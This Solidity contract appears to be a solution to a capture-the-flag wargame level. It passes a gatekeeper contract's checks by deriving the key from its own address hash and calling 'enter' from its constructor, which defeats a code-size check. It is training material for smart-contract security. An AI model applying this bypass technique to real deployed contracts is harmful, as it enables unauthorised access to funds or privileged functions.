// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatesmasherTwo {
    constructor() {
        // aka smashGate()
        address gateToSmash = address(
            0x64B8D563526f6Fd170CCF897c38a0a51A06c626B
        );

        bytes8 key = bytes8(
            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
                (
                    type(uint64).max /* uint64(0) - 1 */
                )
        );

        bytes memory payload = abi.encodeWithSignature("enter(bytes8)", key);

        (bool success, ) = gateToSmash.call(payload);

        require(success, "Failed to smashGate().");
    }
}
